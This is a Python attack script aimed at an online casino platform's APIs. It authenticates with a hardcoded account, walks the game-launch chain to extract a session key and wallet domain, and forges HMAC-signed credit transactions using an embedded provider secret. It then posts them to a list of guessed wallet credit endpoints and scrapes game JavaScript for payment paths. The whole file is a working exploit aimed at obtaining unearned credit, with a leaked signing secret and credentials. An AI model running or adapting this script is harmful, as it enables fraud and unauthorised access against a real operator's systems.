#!/usr/bin/env python3 -I
"""F40 — POST probe + game JS path extraction."""
import requests, json, base64, hmac, hashlib, uuid, re, pathlib

TID   = "54ef7626cb381f4bab8be91f0cdbce47"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
ZS_API = "https://iframeapi.ifuse-api.com"
JILI_SECRET = "a68a21221d37222969b99ea0463be0f0a9e51d2ce70aedf28afbeec96ec88e82"

def auth():
    r = requests.post(f"{PBAPI}/pb/authentication",
        json={"strategy":"local","username":"0972571110","password":"Pwned2026!"},
        headers={"Content-Type":"application/json"}, timeout=15)
    return r.json()["accessToken"]

def get_session():
    jwt = auth()
    hdrs = {"Authorization": f"Bearer {jwt}", "template": "vn"}
    r = requests.get(f"{PBAPI}/pb/game-list", headers=hdrs, params={"$limit":200}, timeout=10)
    games = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
    # Must be a Z-Seamless JILI game (ifgtameh.site fragment)
    JILI_PROVIDER_ID = "a20e0d50-2faf-11f0-930b-06f3ddf48b9d"
    jili_games = [g for g in games if g.get("provider_id") == JILI_PROVIDER_ID]
    if not jili_games:
        jili_games = [g for g in games if "jili" in str(g.get("provider_id","")).lower()]
    print(f"[session] {len(jili_games)} JILI games found")
    jili = jili_games[0]
    print(f"[session] using game: {jili.get('name')} ({jili['id']})")
    r2 = requests.post(f"{MGAPI}/mb/enter-game",
        headers={**hdrs,"Content-Type":"application/json"},
        json={"game_list_id": jili["id"], "languageCode": "th"}, timeout=15)
    url = r2.json().get("result",{}).get("url","")
    print(f"[enter-game] raw url: {url[:200]}")
    if "#" not in url:
        raise RuntimeError(f"No fragment in enter-game URL: {url[:200]}")
    fragment = url.split("#",1)[1]
    r3 = requests.post(f"{ZS_API}/getLaunchGameData",
        headers={"Content-Type":"application/json"},
        json={"token": fragment}, timeout=15)
    data = json.loads(r3.json()["result"]["data"])
    game_url = data["url"]
    from urllib.parse import urlparse, parse_qs
    qs = parse_qs(urlparse(game_url).query)
    sso_key = qs["ssoKey"][0]
    api_id = qs.get("apiId", ["1701"])[0]
    be = qs.get("be", [""])[0][::-1]
    print(f"[session] ssoKey={sso_key[:16]}... apiId={api_id} wallet={be}")
    print(f"[game_url] {game_url}")
    return sso_key, api_id, be, game_url

def sign(secret, fields):
    msg = "".join(str(f) for f in fields).encode()
    return hmac.new(secret.encode(), msg, hashlib.sha256).hexdigest()

def build_payload(sso, api_id, amount_thb=100):
    txn = str(uuid.uuid4()).replace("-","").upper()[:24]
    rnd = str(uuid.uuid4()).replace("-","").upper()[:16]
    amt = int(amount_thb * 100)
    s = sign(JILI_SECRET, [api_id, sso, txn, amt])
    return {"apiId": int(api_id), "token": sso, "txnId": txn,
            "roundId": rnd, "gameCode": "641", "amount": amt, "sign": s}

def scan_game_js(game_url):
    """Fetch game HTML + JS, extract wallet endpoint URLs."""
    print("\n[js-scan] fetching game page...")
    try:
        r = requests.get(game_url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        html = r.text
        # Find JS bundle URLs
        js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', html)
        print(f"[js-scan] found {len(js_urls)} JS files")
        for js_url in js_urls[:5]:
            if not js_url.startswith("http"):
                from urllib.parse import urljoin
                js_url = urljoin(game_url, js_url)
            try:
                jr = requests.get(js_url, timeout=10)
                jtext = jr.text
                # Look for wallet/credit endpoint patterns
                hits = re.findall(r'["\'/]((?:[a-z]+/)*(?:credit|wallet|debit|balance|bet|win)[^"\'<]{0,60})["\']', jtext, re.I)
                if hits:
                    print(f"[js-scan] {js_url[:80]}")
                    for h in set(hits[:20]):
                        print(f"    → /{h}")
            except Exception as e:
                print(f"[js-scan] ERR {js_url[:60]}: {e!s:.40}")
    except Exception as e:
        print(f"[js-scan] ERR: {e}")

sso, api_id, wallet_domain, game_url = get_session()

# Scan JS for real endpoint path
scan_game_js(game_url)

# POST probe — try common paths with proper payload
payload = build_payload(sso, api_id, 100)
wallet_base = f"https://{wallet_domain}"

print(f"\n[post-probe] wallet_base={wallet_base}")
paths = [
    "/credit", "/api/credit", "/wallet/credit", "/gameApi/wallet/credit",
    "/api/wallet/credit", "/seamless/credit", "/callback/credit",
    "/api/v1/wallet/credit", "/jili/credit", "/game/credit",
    "/api/game/credit", "/v1/credit", "/v2/credit",
]
for path in paths:
    url = f"{wallet_base}{path}"
    try:
        r = requests.post(url, json=payload,
            headers={"Content-Type": "application/json"}, timeout=6)
        print(f"  POST {path} → {r.status_code} {r.text[:100]!r}")
    except Exception as e:
        print(f"  POST {path} → ERR {str(e)[:60]}")
